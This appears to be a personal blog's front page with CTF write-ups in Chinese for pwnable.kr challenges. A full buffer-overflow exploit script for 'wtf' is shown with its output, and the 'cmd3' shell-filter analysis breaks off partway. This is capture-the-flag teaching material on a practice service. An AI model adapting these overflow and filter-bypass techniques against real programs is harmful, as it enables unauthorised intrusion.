<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.3.0',
    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  





  <script>
  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
  daovoice('init', {
      app_id: "7b5da8eb"
    });
  daovoice('update');
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="R00tnb&#39;s Blog">
<meta property="og:url" content="https://r00tnb.github.io/index.html">
<meta property="og:site_name" content="R00tnb&#39;s Blog">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="R00tnb&#39;s Blog">






  <link rel="canonical" href="https://r00tnb.github.io/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>R00tnb's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>
    <a href="https://github.com/r00tnb/"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">R00tnb's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/07/16/pwnable.kr-wtf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/16/pwnable.kr-wtf/" itemprop="url">
                  pwnable.kr-wtf
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-07-16 16:03:00" itemprop="dateCreated datePublished" datetime="2018-07-16T16:03:00+08:00">2018-07-16</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/16/pwnable.kr-wtf/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/07/16/pwnable.kr-wtf/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/07/16/pwnable.kr-wtf/" class="leancloud_visitors" data-flag-title="pwnable.kr-wtf">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道代码很简单，但是却花了我好长时间的题目。挺有意思的，考察输入缓冲区的。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>还是先分析代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> os, sys, time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Timer</span><br><span class="line"></span><br><span class="line">TIME = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTimer</span><span class="params">()</span>:</span></span><br><span class="line">	timer=<span class="keyword">None</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.timer = Timer(TIME, self.dispatch, args=[])</span><br><span class="line">		self.timer.start()</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">dispatch</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'program is not responding... something must be wrong :('</span></span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">( payload )</span>:</span></span><br><span class="line">	p = subprocess.Popen(<span class="string">'./wtf'</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE)</span><br><span class="line">	p.stdin.write( payload )</span><br><span class="line">	output = p.stdout.readline()</span><br><span class="line">	<span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'''</span></span><br><span class="line"><span class="string">	---------------------------------------------------</span></span><br><span class="line"><span class="string">	-              Shall we play a game?              -</span></span><br><span class="line"><span class="string">	---------------------------------------------------</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Hey~, I'm a newb in this pwn(?) thing...</span></span><br><span class="line"><span class="string">	I'm stuck with a very easy bof task called 'wtf'</span></span><br><span class="line"><span class="string">	I think this is quite easy task, however my</span></span><br><span class="line"><span class="string">	exploit payload is not working... I don't know why :(</span></span><br><span class="line"><span class="string">	I want you to help me out here.</span></span><br><span class="line"><span class="string">	please check out the binary and give me payload</span></span><br><span class="line"><span class="string">	let me try to pwn this with yours.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	                            - Sincerely yours, newb</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	sys.stdout.flush()</span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		sys.stdout.write(<span class="string">'payload please : '</span>)</span><br><span class="line">		sys.stdout.flush()		</span><br><span class="line">		payload = raw_input()</span><br><span class="line">		payload = payload.decode(<span class="string">'hex'</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'please give your payload in hex encoded format..'</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'thanks! let me try if your payload works...'</span></span><br><span class="line">	sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	MyTimer()</span><br><span class="line">	result = pwn( payload )</span><br><span class="line">	<span class="keyword">if</span> len(result) == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'your payload sucks! :('</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">'I thought you were expert... what a shame :P'</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'hey! your payload got me this : &#123;0&#125;\n'</span>.format(result)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'I admit, you are indeed an expert :)'</span></span><br><span class="line">	sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sys.stdout.flush()</span><br><span class="line">	os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"preventing buffer overflow"</span>);</span><br><span class="line">    v5 = <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  my_fgets((__int64)&amp;v4, v5);                   <span class="comment">// Stack Overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">my_fgets</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Bh] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a2;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v4-- != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>贴了<code>wtf.py</code>代码和<code>wtf</code>的部分反编译代码。<code>wtf.py</code>代码的逻辑很简单，只要输入一段<code>wtf</code>的利用代码并能成功利用即可。分析可执行程序<code>wtf</code>发现有一处栈溢出和一处有符号整数比较漏洞，而且有一个<code>win</code>函数可直接读取flag，所以利用很简单。但是，当把利用代码一次性输入进程序时，程序一直卡住，而分开两次输入就没有问题（即先输入size，再输入poc）。当时想了半天终于想到会不会是程序的输入缓冲区设置了全缓冲模式（即缓冲区装满后才会读取），但是怎么也没找到代码。不过后来试了一下成功了，用4096个字符填满了输入缓冲区，下面是poc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line">shell_addr = <span class="number">0x4005f4</span></span><br><span class="line"><span class="comment">#r = process('python ./wtf.py',shell=True)</span></span><br><span class="line">r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9015</span>)</span><br><span class="line">r.recvuntil(<span class="string">'payload please : '</span>)</span><br><span class="line">poc = <span class="string">'-1'</span>+<span class="string">'\n'</span>*<span class="number">4094</span>+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(shell_addr)+<span class="string">'\n'</span> </span><br><span class="line">r.sendline(poc.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/mnt/hgfs/work/pwn# python wtfpoc.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9015: Done</span><br><span class="line">[+] Receiving all data: Done (146B)</span><br><span class="line">[*] Closed connection to pwnable.kr port 9015</span><br><span class="line">thanks! let me try if your payload works...</span><br><span class="line">hey! your payload got me this : I_H4T3_L1BC_BUFF3R1NG_5HIT_L0L</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">I admit, you are indeed an expert :)</span><br></pre></td></tr></table></figure>
<p>从flag中也可看出确实考察的缓冲区</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>题目代码简单，就是卡在了输入缓冲区上面，还是技术不到没能第一时间想到。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/07/11/pwnable.kr-cmd3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/11/pwnable.kr-cmd3/" itemprop="url">
                  pwnable.kr-cmd3
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-07-11 12:18:00" itemprop="dateCreated datePublished" datetime="2018-07-11T12:18:00+08:00">2018-07-11</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/11/pwnable.kr-cmd3/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/07/11/pwnable.kr-cmd3/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/07/11/pwnable.kr-cmd3/" class="leancloud_visitors" data-flag-title="pwnable.kr-cmd3">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是<code>cmd2</code>的升级版，题目做了很多限制，我也是花了好长时间才想出来。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目给出了<code>cmd3.py</code>的源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> base64, random, math</span><br><span class="line"><span class="keyword">import</span> os, sys, time, string</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Timer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rstring</span><span class="params">(N)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(N))</span><br><span class="line"></span><br><span class="line">password = rstring(<span class="number">32</span>)</span><br><span class="line">filename = rstring(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">TIME = <span class="number">60</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTimer</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> filename</span><br><span class="line">        timer=<span class="keyword">None</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">                self.timer = Timer(TIME, self.dispatch, args=[])</span><br><span class="line">                self.timer.start()</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dispatch</span><span class="params">(self)</span>:</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'time expired! bye!'</span></span><br><span class="line">		sys.stdout.flush()</span><br><span class="line">		os.system(<span class="string">'rm flagbox/'</span>+filename)</span><br><span class="line">                os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(cmd)</span>:</span></span><br><span class="line">	blacklist = <span class="string">'` !&amp;|"\'*'</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">		<span class="keyword">if</span> ord(c)&gt;<span class="number">0x7f</span> <span class="keyword">or</span> ord(c)&lt;<span class="number">0x20</span>: <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">		<span class="keyword">if</span> c.isalnum(): <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">in</span> blacklist: <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	MyTimer()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'your password is in flagbox/&#123;0&#125;'</span>.format(filename)</span><br><span class="line">	os.system(<span class="string">"ls -al"</span>)</span><br><span class="line">	os.system(<span class="string">"ls -al jail"</span>)</span><br><span class="line">	open(<span class="string">'flagbox/'</span>+filename, <span class="string">'w'</span>).write(password)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">			sys.stdout.write(<span class="string">'cmd3$ '</span>)</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			cmd = raw_input()</span><br><span class="line">			<span class="keyword">if</span> cmd==password:</span><br><span class="line">				os.system(<span class="string">'./flagbox/print_flag'</span>)</span><br><span class="line">				<span class="keyword">raise</span> <span class="number">1</span></span><br><span class="line">			<span class="keyword">if</span> filter(cmd) <span class="keyword">is</span> <span class="keyword">False</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'caught by filter!'</span></span><br><span class="line">				sys.stdout.flush()</span><br><span class="line">				<span class="keyword">raise</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">			os.system(<span class="string">'echo "&#123;0&#125;" | base64 -d - | env -i PATH=jail /bin/rbash'</span>.format(cmd.encode(<span class="string">'base64'</span>)))</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		os.system(<span class="string">'rm flagbox/'</span>+filename)</span><br><span class="line">		os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>从源码中可以看出一下限制：</p>
<ul>
<li>程序使用了一个过滤函数<code>filter</code>。该函数不允许输入中带有<code>0-9a-zA-Z</code>和<code></code> !&amp;|”\’*`的字符，并且输入必须在可打印字符的范围内。</li>
<li>通过过滤函数的检查后，输入会被<code>base64</code>编码再传入<code>os.system</code>函数执行命令。所以这里也无法命令注入。</li>
